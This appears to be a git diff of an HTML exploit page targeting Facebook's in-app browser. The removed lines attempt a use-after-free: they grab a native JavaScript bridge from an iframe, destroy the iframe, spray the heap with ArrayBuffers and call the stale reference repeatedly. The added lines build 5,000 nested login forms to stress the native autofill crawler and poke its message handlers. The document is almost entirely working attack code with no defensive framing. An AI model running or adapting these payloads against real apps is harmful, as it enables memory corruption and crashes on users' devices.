@@ -2,55 +2,70 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSI Dangling Pointer</title>
+    <title>Native Crawler Fuzzer</title>
 </head>
-<body style="background:#000; color:#f00; font-family:monospace;">
-    <h3>Extracting and Firing Dangling Pointers...</h3>
-    <div id="container"></div>
+<body style="background:#000; color:#ff0; font-family:monospace;">
+    <h3>Deploying DOM Fractal...</h3>
+    <div id="log">Building deep structure...</div>
+    
+    <div id="root"></div>
 
     <script>
-        const container = document.getElementById('container');
-        const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
-        
-        function fireUAF() {
-            // 1. Spawn an isolated IFrame
-            let f = document.createElement('iframe');
-            container.appendChild(f);
+        const logEl = document.getElementById('log');
+
+        function buildFractal() {
+            let currentElement = document.getElementById('root');
             
-            // 2. Give Facebook's Java layer 400ms to inject the bridge into the new IFrame
-            setTimeout(() => {
-                let iwin = f.contentWindow;
+            // Create 5,000 deeply nested forms. 
+            // This is visually nothing, but structurally a nightmare for a C++ recursive function.
+            for (let i = 0; i < 5000; i++) {
+                let form = document.createElement('form');
+                form.id = "f" + i;
                 
-                if (iwin && iwin.__call_iabjs_unified_bridge) {
-                    // 3. Steal the native bridge reference before destruction
-                    let stolenBridge = iwin.__call_iabjs_unified_bridge;
-                    
-                    // 4. Destroy the IFrame!
-                    // This forces Chromium to delete the C++ RenderFrameHost.
-                    f.remove();
-                    
-                    // 5. Thrash the memory heap.
-                    // We allocate garbage to overwrite the exact memory space where 
-                    // the C++ bridge object used to live.
-                    let spray = [];
-                    for(let i = 0; i < 5000; i++) spray.push(new ArrayBuffer(1024));
-                    
-                    // 6. The Execution (Use-After-Free)
-                    // We call the stolen reference. If libhelium.so didn't invalidate
-                    // this handle during the IFrame teardown, it jumps into our sprayed memory.
+                let input1 = document.createElement('input');
+                input1.type = "text";
+                input1.name = "username_" + i;
+                input1.autocomplete = "username";
+                
+                let input2 = document.createElement('input');
+                input2.type = "password";
+                input2.name = "password_" + i;
+                input2.autocomplete = "current-password";
+
+                form.appendChild(input1);
+                form.appendChild(input2);
+                
+                // NEST the form inside the previous form
+                currentElement.appendChild(form);
+                currentElement = form;
+            }
+
+            logEl.innerText = "[*] Fractal built. Waking up FB Autofill engine...";
+
+            // Trigger Facebook's native crawler to scan the page
+            setTimeout(() => {
+                // Focus an input deep in the tree to force the IME and Autofill to evaluate the DOM
+                let deepInput = document.getElementsByName('password_4990')[0];
+                if(deepInput) deepInput.focus();
+
+                // Manually ping the Autofill Handler if it exists
+                if (window._AutofillMessageHandler) {
                     try {
-                        stolenBridge("page_language", uuid, '{"message":{}}');
+                        window._AutofillMessageHandler.postMessage('{"action":"request_autofill"}');
                     } catch(e) {}
-                    
-                } else {
-                    // Clean up if it wasn't injected yet
-                    f.remove();
                 }
-            }, 400); 
+                
+                // Ping the unified bridge to force a layout recalculation
+                if (window.__call_iabjs_unified_bridge) {
+                    try {
+                        window.__call_iabjs_unified_bridge("page_language", "90dd8846-f47b-4312-8307-3681dc5bec88", "{}");
+                    } catch(e) {}
+                }
+            }, 1000);
         }
 
-        // Loop the attack to ensure we hit the exact garbage collection window
-        setInterval(fireUAF, 600);
+        // Run the builder
+        setTimeout(buildFractal, 500);
     </script>
 </body>
 </html>
